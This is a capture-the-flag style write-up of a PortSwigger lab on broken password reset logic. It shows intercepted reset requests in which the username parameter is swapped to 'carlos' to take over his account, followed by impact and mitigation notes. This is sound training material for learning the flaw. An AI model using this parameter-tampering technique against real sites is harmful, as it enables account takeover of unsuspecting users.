# Password reset broken logic

**Source:** [PortSwigger](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)  
**Category:** Authentication vulnerabilities  
**Difficulty:** APPRENTICE

## Objective
To solve the lab, reset Carlos's password then log in and access his "My account" page.

## Vulnerability
This lab's password reset functionality is vulnerable.

Your credentials: `wiener:peter`  
Victim's username: `carlos`

## Exploitation

## Exploitation

### Steps

1. Logged in using `wiener:peter` and copied the email address visible after logging in:

```html
wiener@exploit-0a26002a0445f58881e8845601fd00d9.exploit-server.net
```

Then logged out.

2. Opened the login page, selected **Forgot password**, and entered the email address. Then opened the **Email client**. The raw email looked like this:

```http
Sent:     2026-07-30 18:03:17 +0000
From:     "No reply" <no-reply@0af100690419f58081da85c200e4006c.web-security-academy.net>
To:       wiener@exploit-0a26002a0445f58881e8845601fd00d9.exploit-server.net
Subject:  Account recovery

Hello!

Please follow the link below to reset your password.

https://0af100690419f58081da85c200e4006c.web-security-academy.net/forgot-password?temp-forgot-password-token=q6no2dw175j70k5muesfa8v0m5bvi70t

Thanks,
Support team
```

3. Opened the password reset link, changed the password to `test`, and intercepted the HTTP request. The request contained a potential vulnerability:

```http
temp-forgot-password-token=q6no2dw175j70k5muesfa8v0m5bvi70t&username=wiener&new-password-1=test&new-password-2=test
```

Changed the `username` parameter to `carlos` and sent the request:

```http
temp-forgot-password-token=q6no2dw175j70k5muesfa8v0m5bvi70t&username=carlos&new-password-1=test&new-password-2=test
```

4. Attempted to log in using `carlos:test`, which was successful.

### Payload

Original request:

```http
temp-forgot-password-token=q6no2dw175j70k5muesfa8v0m5bvi70t&username=wiener&new-password-1=test&new-password-2=test
```

Modified request:

```http
temp-forgot-password-token=q6no2dw175j70k5muesfa8v0m5bvi70t&username=carlos&new-password-1=test&new-password-2=test
```

### Shortcut

1. Request a password reset for your own account and intercept the password reset request.
2. Replace the `username` parameter with `carlos` while keeping your valid reset token.
3. Send the modified request and log in as `carlos` using the new password.

## Impact

An attacker can reset another user's password by modifying the `username` parameter in the password reset request. This allows complete account takeover without requiring access to the victim's email account.

## Mitigation

Bind password reset tokens to the user account they were issued for and validate this association on the server.

Additional protections:
- Ignore client-supplied usernames during password resets and determine the target account from the reset token.
- Generate cryptographically secure, single-use reset tokens with a short expiration time.
- Invalidate tokens immediately after a successful password reset.
- Log and monitor password reset activity for suspicious behavior.

## Tools

- Browser
- Burp Suite

## Notes

This lab demonstrates a broken password reset implementation where the reset token is not properly associated with the intended user account. Because the application trusts the client-supplied `username` parameter, a valid token issued for one user can be reused to reset another user's password.